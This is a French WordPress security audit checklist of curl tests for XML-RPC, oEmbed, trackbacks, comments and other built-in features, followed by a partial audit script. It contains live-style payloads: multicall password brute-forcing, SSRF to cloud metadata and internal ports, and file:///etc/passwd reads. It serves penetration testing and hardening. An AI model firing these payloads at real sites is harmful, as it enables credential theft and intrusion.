# Checklist 14, Audit de Sécurité des Fonctionnalités WordPress

**Objectif :** Identifier et évaluer les risques des fonctionnalités intégrées de WordPress souvent négligées mais exploitables à distance.

**Méthode :** Requêtes HTTP uniquement (pas d'authentification). Aucun accès admin requis.

**Cibles :** Sites WordPress standards (version 4.0+).

---

## 1. WP-Cron, Détection et analyse DoS

### 1.1, Détection du wp-cron.php par défaut

WP-Cron s'exécute via `wp-cron.php`, appelé sur chaque page visitée. C'est un vecteur DoS sur les sites à fort trafic ou en hébergement mutualisé.

```bash
# Test 1 : Vérifier si wp-cron.php répond (HTTP 200 ≠ forcément vulnérable)
curl -sI "https://example.com/wp-cron.php" -o /dev/null -w "HTTP_CODE:%{http_code} TIME:%{time_total}s\n"

# Test 2 : Détection via le paramètre ?doing_wp_cron (le serveur ajoute ce flag en session)
curl -sI "https://example.com/wp-cron.php?doing_wp_cron=1" -o /dev/null -w "HTTP_CODE:%{http_code} SIZE:%{size_download}\n"

# Test 3 : Vérifier la différence de temps de réponse entre wp-cron.php et une page normale
time curl -s "https://example.com/wp-cron.php" -o /dev/null
```

**Réponse attendue (sécurisé / DISABLE_WP_CRON défini) :**
- `HTTP 200` mais réponse vide ou triviale (~0-1 Ko)
- `HTTP 302` (redirection vers l'accueil)
- `HTTP 403` ou `404` (bloqué par WAF/plugin)

**Réponse vulnérable :**
- `HTTP 200` avec réponse non triviale, exécution effective du cron
- Temps de réponse long ou variable (le cron tourne sur chaque hit)

**Alternative cron (WP-CLI / système) :**
- WP-CLI : impossible à détecter à distance (s'exécute en CLI uniquement)
- Cron système : impossible à détecter à distance
- Indice indirect : `X-Robots-Tag: noindex` sur `wp-cron.php` via `.htaccess` → possible configuration sécurisée

**Severité :** 🔴 **Haute** (DoS si non désactivé sur site à fort trafic, consommation CPU dans le pool d'hébergement mutualisé)

### 1.2, Détection des cron jobs alternatifs (distant)

```bash
# Détection via les actions cron exposées dans l'API REST
curl -s "https://example.com/wp-json/wp/v2/" | jq '.routes' 2>/dev/null | grep -i cron

# Certains plugins exposent des endpoints cron custom
curl -s "https://example.com/wp-cron.php?cron=1" -o /dev/null -w "HTTP_CODE:%{http_code}\n"
```

**Réponse vulnérable :** Endpoint cron personnalisé accessible sans authentification.

**Severité :** 🟠 **Moyenne** (dépend du contexte)

---

## 2. Heartbeat API, Détection et analyse DoS

### 2.1, Détection de l'endpoint Heartbeat

```bash
# Test 1 : Requête Heartbeat via admin-ajax.php avec l'action heartbeat
curl -s "https://example.com/wp-admin/admin-ajax.php" \
  -H "Content-Type: application/x-www-form-urlencoded" \
  -d "action=heartbeat&_nonce=fake&data[interval]=15" | head -c 500

# Test 2 : Heartbeat avec intervalle réduit (1 seconde, DoS potentiel)
curl -s "https://example.com/wp-admin/admin-ajax.php" \
  -H "Content-Type: application/x-www-form-urlencoded" \
  -d "action=heartbeat&_nonce=fake&data[interval]=1" | head -c 500
```

**Réponse attendue (sécurisé) :**
- `HTTP 200` avec `{"error":true}` ou `-1` (nonce invalide, mais le script tourne)
- `HTTP 403` si l'endpoint est bloqué
- Temps de réponse rapide < 200ms

**Réponse vulnérable :**
- `HTTP 200` avec réponse contenant des données Heartbeat (même avec nonce invalide, le script charge les ressources)
- Temps de réponse anormal (traitement lourd côté serveur)

**Intervalle par défaut vulnérable :** Heartbeat post.js interval par défaut = 15s en mode admin, 60s en mode éditeur, une modification à 5s ou moins est excessive.

### 2.2, Vérification de la surcharge potentielle

```bash
# Test avec intervalle agressif (simulation client, pas de DoS réel, juste tester le comportement)
for i in 1 2 3; do
  time curl -s -o /dev/null "https://example.com/wp-admin/admin-ajax.php" \
    -H "Content-Type: application/x-www-form-urlencoded" \
    -d "action=heartbeat&_nonce=fake&data[interval]=5"
done
```

**Indices d'intervalle trop court (configuration à risque) :**
- Présence de `wp_heartbeat_settings` modifié dans le thème/plugin (non vérifiable à distance directement)
- Temps de réponse > 500ms sur chaque heartbeat → effet domino en mutualisé
- Sites qui modifient Heartbeat à 5s ou moins pour des features « live »

**Severité :** 🟢 **Basse** seul / 🟠 **Moyenne** si combiné à un trafic important (surcharge mutualisé)

---

## 3. XML-RPC, Audit approfondi

### 3.1, Détection de l'endpoint XML-RPC

```bash
# Test d'accès de base
curl -sI "https://example.com/xmlrpc.php" -o /dev/null -w "HTTP_CODE:%{http_code} SERVER:%{server}\n"
```

**Réponse :** HTTP 405 (Method Not Allowed, le endpoint existe) ou HTTP 200 avec en-tête `Allow: POST`.

### 3.2, demo.sayHello (disponibilité)

```bash
curl -s "https://example.com/xmlrpc.php" \
  -H "Content-Type: text/xml" \
  -d '<?xml version="1.0"?>
<methodCall>
  <methodName>demo.sayHello</methodName>
</methodCall>'
```

**Réponse attendue (désactivé) :**
- `HTTP 200` avec `<fault><value><struct><member><name>faultCode</name><value><int>405</int></value></member></struct></value></fault>`
- `HTTP 403`, `404`, ou timeout (bloqué au niveau serveur/WAF)

**Réponse vulnérable :**
- `HTTP 200` avec `<string>Hello!</string>` → XML-RPC entièrement accessible

**Severité :** 🟠 **Moyenne** (confirme que l'endpoint est actif)

### 3.3, system.listMethods (inventaire complet)

```bash
curl -s "https://example.com/xmlrpc.php" \
  -H "Content-Type: text/xml" \
  -d '<?xml version="1.0"?>
<methodCall>
  <methodName>system.listMethods</methodName>
</methodCall>'
```

**Réponse vulnérable :** Liste complète des méthodes disponibles (souvent 100+) incluant `wp.getUsersBlogs`, `system.multicall`, `pingback.ping`, etc.

**Méthodes à risque particulier (surveiller leur présence dans la liste) :**
- `system.multicall` → amplification brute-force
- `pingback.ping` → DDoS/SSRF
- `wp.getUsersBlogs` → test de credentials
- `mt.getRecentPostTitles` → test de credentials
- `wp.getComments` → fuite d'information

**Severité :** 🟠 **Moyenne** (confirme la surface d'attaque)

### 3.4, system.multicall (amplification brute-force)

```bash
# Requête multicall contenant plusieurs tentatives de connexion
curl -s "https://example.com/xmlrpc.php" \
  -H "Content-Type: text/xml" \
  -d '<?xml version="1.0"?>
<methodCall>
  <methodName>system.multicall</methodName>
  <params>
    <param>
      <value>
        <array>
          <data>
            <value>
              <struct>
                <member>
                  <name>methodName</name>
                  <value><string>wp.getUsersBlogs</string></value>
                </member>
                <member>
                  <name>params</name>
                  <value>
                    <array>
                      <data>
                        <value><string>admin</string></value>
                        <value><string>password1</string></value>
                      </data>
                    </array>
                  </value>
                </member>
              </struct>
            </value>
            <value>
              <struct>
                <member>
                  <name>methodName</name>
                  <value><string>wp.getUsersBlogs</string></value>
                </member>
                <member>
                  <name>params</name>
                  <value>
                    <array>
                      <data>
                        <value><string>admin</string></value>
                        <value><string>password2</string></value>
                      </data>
                    </array>
                  </value>
                </member>
              </struct>
            </value>
          </data>
        </array>
      </value>
    </param>
  </params>
</methodCall>'
```

**Réponse vulnérable :** `HTTP 200` avec des réponses multiples dans `<array><data>`. Chaque tentative de connexion est traitée individuellement dans une seule requête HTTP, facteur d'amplification de 1:50+.

**Impact :** 1 requête HTTP = 50+ tentatives de brute-force. Bypasse les limites de taux basées sur IP standard.

**Severité :** 🔴 **Haute** (amplification brute-force massive si actif)

### 3.5, pingback.ping (DDoS + SSRF + scan port)

```bash
# Test 1 : Pingback vers une URL externe contrôlée (test SSRF)
curl -s "https://example.com/xmlrpc.php" \
  -H "Content-Type: text/xml" \
  -d '<?xml version="1.0"?>
<methodCall>
  <methodName>pingback.ping</methodName>
  <params>
    <param><value><string>http://YOUR-SSRF-CONTROL-SERVER/probe</string></value></param>
    <param><value><string>https://example.com/?p=1</string></value></param>
  </params>
</methodCall>'

# Test 2 : Scan de port via pingback (test sur localhost:3306, MySQL)
curl -s "https://example.com/xmlrpc.php" \
  -H "Content-Type: text/xml" \
  -d '<?xml version="1.0"?>
<methodCall>
  <methodName>pingback.ping</methodName>
  <params>
    <param><value><string>http://127.0.0.1:3306/test</string></value></param>
    <param><value><string>https://example.com/?p=1</string></value></param>
  </params>
</methodCall>'

# Test 3 : Test de base (cible interne locale)
curl -s "https://example.com/xmlrpc.php" \
  -H "Content-Type: text/xml" \
  -d '<?xml version="1.0"?>
<methodCall>
  <methodName>pingback.ping</methodName>
  <params>
    <param><value><string>http://169.254.169.254/latest/meta-data/</string></value></param>
    <param><value><string>https://example.com/?p=1</string></value></param>
  </params>
</methodCall>'
```

**Codes de réponse pingback :**
- `0`, Pingback enregistré avec succès (SSRF réussi)
- `16`, Source URL ne contient pas de lien vers la cible = tentative détectée mais SSRF peut quand même fonctionner selon l'implémentation
- `17`, Pingback déjà enregistré
- `32` - `33`, La source URL n'existe pas ou n'est pas valide (protection partielle)
- `48`, Pingback désactivé sur cette article (protection)
- Erreur serveur ou timeout → SSRf potentiellement réussi vers destination

**Réponse vulnérable :** Code `0` ou toute réponse qui n'est pas une erreur explicite.

**Severité :** 🔴 **Haute** (SSRF vers cloud metadata, scan de ports interne, DDoS amplification)

### 3.6, wp.getUsersBlogs (test de credentials)

```bash
curl -s "https://example.com/xmlrpc.php" \
  -H "Content-Type: text/xml" \
  -d '<?xml version="1.0"?>
<methodCall>
  <methodName>wp.getUsersBlogs</methodName>
  <params>
    <param><value><string>admin</string></value></param>
    <param><value><string>password</string></value></param>
  </params>
</methodCall>'
```

**Réponse vulnérable (crédentials valides) :**
```xml
<array><data><value><struct>
  <member><name>isAdmin</name><value><boolean>1</boolean></value></member>
  <member><name>url</name><value><string>https://example.com/</string></value></member>
  <member><name>blogid</name><value><string>1</string></value></member>
  <member><name>blogName</name><value><string>Mon Site</string></value></member>
  <member><name>xmlrpc</name><value><string>https://example.com/xmlrpc.php</string></value></member>
</struct></value></data></array>
```

**Réponse attendue (refusée / protégée) :**
```xml
<fault><value><struct>
  <member><name>faultCode</name><value><int>403</int></value></member>
  <member><name>faultString</name><value><string>Incorrect username or password.</string></value></member>
</struct></value></fault>
```

**Note :** Cette méthode est aussi utilisée pour valider des credentials dans les attaques brute-force via `system.multicall`.

**Severité :** 🟢 **Basse** (dépend de l'existence de credentials valides, test de validité)

### 3.7, mt.getRecentPostTitles (test de credentials)

```bash
curl -s "https://example.com/xmlrpc.php" \
  -H "Content-Type: text/xml" \
  -d '<?xml version="1.0"?>
<methodCall>
  <methodName>mt.getRecentPostTitles</methodName>
  <params>
    <param><value><int>1</int></value></param>
    <param><value><string>admin</string></value></param>
    <param><value><string>password</string></value></param>
  </params>
</methodCall>'
```

**Réponse vulnérable (crédentials valides) :** Liste des titres des articles récents + métadonnées.

**Réponse refusée :** Erreur 403.

**Severité :** 🟢 **Basse** (outil de validation de credentials, amplifié via multicall)

### 3.8, Bypass potentiel de protection XML-RPC

```bash
# Test si le endpoint répond sur d'autres chemins communs
for path in xmlrpc.php xml-rpc.php xmlrpc xmlrpc.php/ rpc.php; do
  echo -n "$path: "
  curl -sI "https://example.com/$path" -o /dev/null -w "%{http_code}\n"
done

# Test si le WAF bloque le Content-Type XML
curl -s "https://example.com/xmlrpc.php" \
  -H "Content-Type: application/xml" \
  -d '<?xml version="1.0"?><methodCall><methodName>system.listMethods</methodName></methodCall>'

# Test avec encodage alternatif
curl -s "https://example.com/xmlrpc.php" \
  -H "Content-Type: text/plain" \
  -d '<?xml version="1.0"?><methodCall><methodName>system.listMethods</methodName></methodCall>'
```

**Severité :** 🟠 **Moyenne** (bypass de protection partielle)

---

## 4. oEmbed, SSRF et fuite d'information

### 4.1, Détection de l'endpoint oEmbed

```bash
# Test 1 : Endpoint oEmbed JSON
curl -s "https://example.com/wp-json/oembed/1.0/embed?url=https://example.com/&format=json"

# Test 2 : Endpoint oEmbed XML
curl -s "https://example.com/?oembed=1&url=https://example.com/&format=xml" | head -c 1000
```

**Réponse attendue (actif) :** JSON/XML contenant le titre, l'URL, le type de contenu, et les dimensions du média.

**Réponse sécurisé :** `HTTP 404`, `HTTP 301` (redirection), ou vide.

**Severité :** 🟢 **Basse** (leak d'information mineur)

### 4.2, Test SSRF via oEmbed (external URL endpoint)

```bash
# Test 1 : SSRF simple vers un serveur externe contrôlé
curl -s "https://example.com/wp-json/oembed/1.0/embed?url=http://YOUR-SSRF-SERVER/probe&format=json"

# Test 2 : SSRF vers les métadonnées cloud (AWS)
curl -s "https://example.com/wp-json/oembed/1.0/embed?url=http://169.254.169.254/latest/meta-data/&format=json"

# Test 3 : SSRF vers des ports internes
curl -s "https://example.com/wp-json/oembed/1.0/embed?url=http://127.0.0.1:8080/admin&format=json"

# Test 4 : SSRF vers les services internes (Redis, Memcached)
curl -s "https://example.com/wp-json/oembed/1.0/embed?url=http://127.0.0.1:11211/&format=json"

# Test 5 : Protocole file (tentative de LFI)
curl -s "https://example.com/wp-json/oembed/1.0/embed?url=file:///etc/passwd&format=json"
```

**Réponse vulnérable :** L'endpoint tente de récupérer le contenu de l'URL distante et l'inclut dans sa réponse ou provoque une erreur différente selon la cible (scan de port). Un délai de réponse plus long indique que la requête a été émise.

**Réponse sécurisé :** Erreur immédiate de type `<p>Le paramètre url est invalide</p>` ou `HTTP 400`.

**Severité :** 🔴 **Haute** (SSRF vers cloud metadata, scan de réseau interne)

### 4.3, Détection de proxy oEmbed (tiers)

```bash
# WordPress peut utiliser des providers oEmbed externes (YouTube, Twitter, etc.)
curl -s "https://example.com/wp-json/oembed/1.0/proxy?url=https://www.youtube.com/watch?v=XXXXXXXXXXX&format=json"
```

**Réponse vulnérable :** L'endpoint proxy existe et répond avec des métadonnées embarquées.

**Severité :** 🟢 **Basse** (exposition de fonctionnalité, SSRF plus limité que l'endpoint embed)

---

## 5. Trackback, Détection et analyse

### 5.1, Détection via RDF dans le HTML

```bash
# Test 1 : Extraire les trackback RDF de la page d'accueil
curl -s "https://example.com/" | grep -i 'trackback' | head -10

# Test 2 : Vérifier sur un article spécifique
curl -s "https://example.com/2025/01/01/sample-post/" | grep -i 'trackback' | head -10
```

**Réponse vulnérable :**
```html
<rdf:RDF xmlns:rdf="http://www.w3.org/1999/02/22-rdf-syntax-ns#"
         xmlns:dc="http://purl.org/dc/elements/1.1/"
         xmlns:trackback="http://madskills.com/public/xmlrpc/ext/trackback/">
<rdf:Description rdf:about="https://example.com/?p=1"
    dc:identifier="https://example.com/?p=1"
    dc:title="Sample Post"
    trackback:ping="https://example.com/wp-trackback.php?p=1" />
</rdf:RDF>
```

**Réponse sécurisé :** Aucun bloc RDF trackback dans le HTML.

**Severité :** 🟢 **Basse** (indicateur que les trackbacks sont activés)

### 5.2, Test de validation du trackback

```bash
# Test 1 : Tentative d'envoi de trackback
curl -s "https://example.com/wp-trackback.php?p=1" \
  -H "Content-Type: application/x-www-form-urlencoded" \
  -d "url=http://YOUR-SITE.com&title=Test+Trackback&excerpt=Test+content&blog_name=Test"

# Test 2 : Trackback vers URL externe (SSRF)
curl -s "https://example.com/wp-trackback.php?p=1" \
  -H "Content-Type: application/x-www-form-urlencoded" \
  -d "url=http://169.254.169.254/latest/meta-data/&title=Test&excerpt=Test&blog_name=Test"

# Test 3 : Trackback avec Protocole file
curl -s "https://example.com/wp-trackback.php?p=1" \
  -H "Content-Type: application/x-www-form-urlencoded" \
  -d "url=file:///etc/passwd&title=Test&excerpt=Test&blog_name=Test"

# Test 4 : Détection de l'endpoint trackback alternatif
curl -sI "https://example.com/wp-trackback.php" -o /dev/null -w "HTTP_CODE:%{http_code}\n"
```

**Réponse vulnérable :**
- `HTTP 200` avec message de succès du trackback (le serveur a traité la soumission)
- Réponse qui diffère quand l'URL cible existe vs n'existe pas (scan de validité)
- Délai de réponse qui varie avec le temps de réponse de l'URL cible (SSRF)

**Réponse sécurisé :**
- `HTTP 403` ou `404`
- `HTTP 200` avec erreur immédiate sans requête externe

**Severité :** 🟠 **Moyenne** (SSRF potentiel, spam, scan de disponibilité)

### 5.3, Détection de la présence de trackback dans le XML-RPC

```bash
curl -s "https://example.com/xmlrpc.php" \
  -H "Content-Type: text/xml" \
  -d '<?xml version="1.0"?>
<methodCall>
  <methodName>system.listMethods</methodName>
</methodCall>' | grep -o 'pingback\.[a-z]*' | sort -u
```

**Réponse vulnérable :** `pingback.ping` présent dans la liste des méthodes.

**Severité :** 🟠 **Moyenne** (SSRF via pingback.ping)

---

## 6. Système de commentaires, Analyse de sécurité

### 6.1, Vérification des commentaires ouverts par défaut

```bash
# Test 1 : Vérifier la présence d'un formulaire de commentaire sur un article
curl -s "https://example.com/?p=1" | grep -i '<form.*comment' | head -5

# Test 2 : Vérifier les commentaires sur la page d'accueil
curl -s "https://example.com/" | grep -c 'comment'

# Test 3 : Tester les commentaires via l'API REST
curl -s "https://example.com/wp-json/wp/v2/comments" | python3 -m json.tool 2>/dev/null | head -30
```

**Réponse vulnérable :**
- Formulaire de commentaire visible sur les articles
- L'API REST `/wp/v2/comments` retourne une liste de commentaires (même paginée)
- Commentaires affichés sans modération (révélé par des spams visibles en page d'accueil)

**Réponse sécurisé :**
- Formulaire de commentaire absent ou remplacé par « Les commentaires sont fermés »
- `wp/v2/comments` retourne une erreur ou liste vide
- Commentaires tous modérés et propres

**Severité :** 🟢 **Basse** (dépend du contexte et modération)

### 6.2, Comment flood protection

```bash
# Test 1 : Vérifier le comportement avec soumissions rapides
for i in 1 2 3 4 5; do
  curl -s "https://example.com/wp-comments-post.php" \
    -H "Content-Type: application/x-www-form-urlencoded" \
    -d "comment=Test+$i&author=Test&email=test@example.com&comment_post_ID=1" \
    -o /dev/null -w "TRY$i:HTTP_%{http_code}\n"
  sleep 0.5
done

# Test 2 : Vérifier la présence de comment flood protection via en-têtes
curl -sI "https://example.com/wp-comments-post.php" -o /dev/null -w "HTTP:%{http_code} FLAG:%{http_version}\n"

# Test 3 : Vérifier si comments_post est accessible
curl -sI "https://example.com/wp-comments-post.php"
```

**Réponse attendue (protégé) :**
- Après 2-3 soumissions rapides, le serveur commence à rejeter avec `HTTP 403` ou redirection vers une page d'erreur
- Rate-limiting visible via des délais de réponse croissants

**Réponse vulnérable :**
- Toutes les soumissions passent (les 5 reçoivent `HTTP 302` sans ralentissement)
- Aucun mécanisme de rate-limiting visible

**Severité :** 🟠 **Moyenne** (spam automatisé, déni de service sur la modération)

### 6.3, Comment author URL disclosure

```bash
# Analyser les commentaires pour les URLs d'auteurs
curl -s "https://example.com/" | grep -oP '<a[^>]*rel="external nofollow"[^>]*>[^<]*</a>' | head -10

# Vérifier si les URLs des auteurs sont des liens actifs
curl -s "https://example.com/" | grep -oP 'href="http[^"]*"[^>]*class="url"' | head -10
```

**Réponse vulnérable :** Liens actifs vers les sites des auteurs dans les commentaires (même avec `rel="nofollow"`, c'est standard, mais toujours une fuite).

**Réponse sécurisé :** Les URLs des auteurs sont supprimées ou rendues non cliquables.

**Severité :** 🟢 **Basse** (fuite d'information mineure, mais peut être exploitée pour cibler les commentateurs)

### 6.4, Registration de commentaire sans nonce

```bash
# Tester si l'endpoint de commentaire nécessite un nonce
curl -s "https://example.com/wp-comments-post.php" \
  -H "Content-Type: application/x-www-form-urlencoded" \
  -d "comment=Test+content&author=Tester&email=tester@test.com&url=&comment_post_ID=1" \
  -o /dev/null -w "HTTP:%{http_code} REDIRECT:%{redirect_url}\n" -L
```

**Réponse vulnérable :** Le commentaire est accepté et redirigé sans nonce ou token CSRF.

**Severité :** 🟠 **Moyenne** (CSRF sur les commentaires, spam automatisé)

---

## 7. Application Passwords (WP 5.6+), Détection

### 7.1, Détection via l'API REST

```bash
# Test 1 : Vérifier l'existence de l'endpoint Application Passwords
curl -s "https://example.com/wp-json/wp/v2/users/me/application-passwords" \
  -o /dev/null -w "HTTP_CODE:%{http_code}\n"

# Test 2 : Vérifier si l'endpoint est dans les routes disponibles
curl -s "https://example.com/wp-json/" | python3 -c "
import sys, json
try:
    data = json.load(sys.stdin)
    routes = list(data.get('routes', {}).keys())
    app_pass_routes = [r for r in routes if 'application' in r.lower() or 'password' in r.lower()]
    print('Application/Password routes found:', app_pass_routes if app_pass_routes else 'None')
except: print('Could not parse')
"

# Test 3 : Vérifier via l'en-tête Allow
curl -sI "https://example.com/wp-json/wp/v2/users/me/application-passwords" \
  -o /dev/null -w "HTTP:%{http_code} ALLOW:%{header[allow]}\n"
```

**Réponse attendue (actif) :**
- `HTTP 401` (Unauthorized, endpoint existe mais nécessite auth) → **confirmé actif**
- L'endpoint apparaît dans les routes de l'API REST

**Réponse (désactivé / WP < 5.6) :**
- `HTTP 404` (route non trouvée)
- Non listé dans les routes de l'API REST

**Réponse vulnérable :**
- `HTTP 200` avec données sensibles (si endpoint exposé sans auth, rare mais possible avec bug de permission)

### 7.2, Vérification fonctionnelle (authentification via App Password)

```bash
# Test : Tentative d'authentification avec Application Password (si on en possède un)
curl -s "https://example.com/wp-json/wp/v2/users/me" \
  -u "user:XXXX XXXX XXXX XXXX XXXX XXXX"
```

**Réponse vulnérable :** Authentification réussie, l'Application Password fonctionne.

**Note :** Ce test ne peut être effectué sans Application Password valide, mais l'existence de l'endpoint confirme la fonctionnalité activée.

**Severité :** 🟠 **Moyenne** (surface d'attaque supplémentaire pour l'authentification)

---

## 8. Site Health (wp-site-health/v1), Information Disclosure

### 8.1, Détection de l'endpoint Site Health

```bash
# Test 1 : Vérifier si l'endpoint Site Health existe
curl -s "https://example.com/wp-json/wp-site-health/v1" \
  -o /dev/null -w "HTTP_CODE:%{http_code}\n"

# Test 2 : Vérifier les routes Site Health disponibles
curl -s "https://example.com/wp-json/" | python3 -c "
import sys, json
try:
    data = json.load(sys.stdin)
    routes = list(data.get('routes', {}).keys())
    health_routes = [r for r in routes if 'site-health' in r.lower() or 'health' in r.lower()]
    print('Health-related routes found:', health_routes if health_routes else 'None')
except: print('Could not parse')
"

# Test 3 : Tentative d'accès direct aux tests de santé
curl -s "https://example.com/wp-json/wp-site-health/v1/tests/background-updates" \
  -o /dev/null -w "HTTP_CODE:%{http_code}\n"
curl -s "https://example.com/wp-json/wp-site-health/v1/tests/loopback-requests" \
  -o /dev/null -w "HTTP_CODE:%{http_code}\n"
```

**Réponse vulnérable :**
- `HTTP 200` avec des informations système (version PHP, extensions chargées, configuration du serveur, état des mises à jour, statistiques)
- `HTTP 401` mais l'endpoint existe (confirme la fonctionnalité, mais nécessite auth pour les données)

**Réponse sécurisé :**
- `HTTP 404` (WP ≤ 5.1 ou endpoint supprimé)
- `HTTP 403` ou `401` avec blocage WAF

### 8.2, Extraction d'informations sensibles

```bash
# Test : Lister toutes les informations exposées si accessible
curl -s "https://example.com/wp-json/wp-site-health/v1" 2>/dev/null | head -c 2000
```

**Informations potentiellement divulguées (si accessible sans auth) :**
- Version PHP exacte
- Extensions PHP chargées
- Taille du répertoire `wp-content/uploads`
- Nombre de plugins/thèmes installés
- État des mises à jour automatiques
- Cache de réécriture d'URL
- Résultats de tests de boucle locale (localhost)

**Severité :** 🟠 **Moyenne** (fuite d'information détaillée sur la configuration serveur)

---

## 9. Block Editor / Block Directory, SSRF Risk

### 9.1, Détection du Block Directory

```bash
# Test 1 : Vérifier via l'API REST si le block directory est actif
curl -s "https://example.com/wp-json/wp/v2/block-directory/search?term=test" \
  -o /dev/null -w "HTTP_CODE:%{http_code}\n"

# Test 2 : Vérifier les routes liées aux blocks
curl -s "https://example.com/wp-json/" | python3 -c "
import sys, json
try:
    data = json.load(sys.stdin)
    routes = list(data.get('routes', {}).keys())
    block_routes = [r for r in routes if 'block' in r.lower()]
    print('Block-related routes:', block_routes if block_routes else 'None')
except: print('Could not parse')
"

# Test 3 : Vérifier l'existence des endpoints block-directory
curl -s "https://example.com/wp-json/wp/v2/block-directory" \
  -o /dev/null -w "HTTP_CODE:%{http_code}\n"
```

**Réponse vulnérable :**
- `HTTP 401` ou `200` sur `/wp/v2/block-directory/search`, **le Block Directory est activé** (WP 5.5+)
- Le Block Directory permet la recherche et l'installation de blocks depuis WordPress.org

### 9.2, Test SSRF via Block Directory Search

```bash
# Test : Tentative de SSRF via la recherche de blocks (le search contacte WordPress.org)
curl -s "https://example.com/wp-json/wp/v2/block-directory/search?term=test&_locale=user" \
  -o /dev/null -w "HTTP_CODE:%{http_code} SIZE:%{size_download}\n"

# Test avec requête longue (potentiel de timing attack)
time curl -s -o /dev/null "https://example.com/wp-json/wp/v2/block-directory/search?term=$(python3 -c 'print("A"*500)')"
```

**Mécanisme SSRF :** Le Block Directory search contacte `api.wordpress.org` pour récupérer les résultats. Bien que limité à WordPress.org, ce mécanisme :
- Confirme que le serveur peut faire des requêtes HTTP externes
- Peut être utilisé comme proxy de requête HTTP vers `api.wordpress.org` (utilisation extensive)
- Indique que la fonctionnalité `wp_remote_get()` est active sur le serveur

**Réponse attendue (actif) :** Même sans auth, l'endpoint peut répondre avec une erreur non sensible.

**Severité :** 🟢 **Basse** (SSRF limité à `api.wordpress.org`, mais confirme la capacité de requêtes externes)

### 9.3, Détection du widget de blocs

```bash
# Vérifier la présence de l'API des widgets/blocs
curl -s "https://example.com/wp-json/wp/v2/widget-types" \
  -o /dev/null -w "HTTP_CODE:%{http_code}\n"
curl -s "https://example.com/wp-json/wp/v2/widgets" \
  -o /dev/null -w "HTTP_CODE:%{http_code}\n"
```

**Réponse :** `HTTP 401` si l'éditeur de blocs est actif.

**Severité :** 🟢 **Basse**

---

## 10. Link Manager, Fonctionnalité Legacy

### 10.1, Détection via l'API REST

```bash
# Test 1 : Vérifier l'existence des endpoints Link Manager
curl -s "https://example.com/wp-json/wp/v2/links" \
  -o /dev/null -w "HTTP_CODE:%{http_code}\n"

# Test 2 : Vérifier dans les routes disponibles
curl -s "https://example.com/wp-json/" | python3 -c "
import sys, json
try:
    data = json.load(sys.stdin)
    routes = list(data.get('routes', {}).keys())
    link_routes = [r for r in routes if '/links' in r.lower()]
    print('Link-related routes:', link_routes if link_routes else 'None')
except: print('Could not parse')
"

# Test 3 : Vérifier si une catégorie de liens existe
curl -s "https://example.com/wp-json/wp/v2/link-categories" \
  -o /dev/null -w "HTTP_CODE:%{http_code}\n"
```

**Réponse attendue (actif, Link Manager enabled) :**
- `HTTP 401` sur `/wp/v2/links`, endpoint existe, fonctionnalité activée
- Routes `/wp/v2/links` et `/wp/v2/link-categories` présentes dans l'API

**Réponse attendue (désactivé / WP récent) :**
- `HTTP 404`, endpoint non trouvé (Link Manager supprimé dans WP 5.5+)
- Routes liens absentes de l'API

### 10.2, Impact de sécurité

```bash
# Si l'API répond, extraire les informations disponibles
curl -s "https://example.com/wp-json/wp/v2/links" 2>/dev/null | python3 -m json.tool 2>/dev/null | head -50
```

**Risques :**
- Fuite d'information sur les liens enregistrés (partenaires, affiliés, sites internes)
- Potentiel de liens vers des ressources internes exposés
- Indique une vieille configuration WordPress (le Link Manager est legacy depuis WP 3.5, supprimé dans WP 5.5+)

**Severité :** 🟢 **Basse** (fuite d'information mineure, mais indicateur d'ancienneté de l'installation)

---

## Résumé des vérifications

| # | Fonctionnalité | Méthode principale | Severité |
|---|---|---|---|
| 1 | WP-Cron | `wp-cron.php` HEAD/GET | 🔴 Haute |
| 2 | Heartbeat API | `admin-ajax.php?action=heartbeat` | 🟠 Moyenne |
| 3 | XML-RPC (multicall) | `xmlrpc.php`, `system.multicall` | 🔴 Haute |
| 3 | XML-RPC (pingback) | `xmlrpc.php`, `pingback.ping` | 🔴 Haute |
| 3 | XML-RPC (inventaire) | `xmlrpc.php`, `system.listMethods` | 🟠 Moyenne |
| 4 | oEmbed SSRF | `wp-json/oembed/1.0/embed?url=` | 🔴 Haute |
| 5 | Trackback | `wp-trackback.php` + RDF HTML | 🟠 Moyenne |
| 6 | Commentaires | `wp-comments-post.php` + API | 🟠 Moyenne |
| 7 | Application Passwords | `wp-json/wp/v2/users/me/application-passwords` | 🟠 Moyenne |
| 8 | Site Health | `wp-json/wp-site-health/v1` | 🟠 Moyenne |
| 9 | Block Directory | `wp-json/wp/v2/block-directory/search` | 🟢 Basse |
| 10 | Link Manager | `wp-json/wp/v2/links` | 🟢 Basse |

---

## Script d'audit automatisé

```bash
#!/bin/bash
# audit-wp-features.sh, Audit complet des fonctionnalités WordPress
# Usage: ./audit-wp-features.sh https://cible.com

TARGET="${1%/}"
REPORT="${TARGET#https://}"
REPORT="${REPORT#http://}"
REPORT="wp-features-audit_${REPORT}.txt"

echo "=== WordPress Features Security Audit ===" | tee "$REPORT"
echo "Target: $TARGET" | tee -a "$REPORT"
echo "Date: $(date)" | tee -a "$REPORT"
echo "========================================" | tee -a "$REPORT"

echo -e "\n[1] WP-CRON" | tee -a "$REPORT"
echo -n "HTTP: " | tee -a "$REPORT"
curl -sI "$TARGET/wp-cron.php" -o /dev/null -w "%{http_code}\n" | tee -a "$REPORT"
echo -n "SIZE: " | tee -a "$REPORT"
curl -s "$TARGET/wp-cron.php" | wc -c | tee -a "$REPORT"

echo -e "\n[2] HEARTBEAT API" | tee -a "$REPORT"
echo -n "HTTP: " | tee -a "$REPORT"
curl -s "$TARGET/wp-admin/admin-ajax.php" \
  -H "Content-Type: application/x-www-form-urlencoded" \
  -d "action=heartbeat&_nonce=fake&data[interval]=15" \
  -o /dev/null -w "%{http_code}\n" | tee -a "$REPORT"

echo -e "\n[3] XML-RPC" | tee -a "$REPORT"
echo -n "Endpoint HTTP: " | tee -a "$REPORT"
curl -sI "$TARGET/xmlrpc.php" -o /dev/null -w "%{http_code}\n" | tee -a "$REPORT"
echo -n "sayHello: " | tee -a "$REPORT"
curl -s "$TARGET/xmlrpc.php" -H "Content-Type: text/xml" \
  -d '<?xml version="1.0"?><methodCall><methodName>demo.sayHello</methodName></methodCall>' \
  | head -c 200 | tee -a "$REPORT"
echo "" | tee -a "$REPORT"

echo -e "\n[4] OEMBED" | tee -a "$REPORT"
echo -n "HTTP: " | tee -a "$REPORT"
curl -s "$TARGET/wp-json/oembed/1.0/embed?url=$TARGET&format=json" \
  -o /dev/null -w "%{http_code}\n" | tee -a "$REPORT"

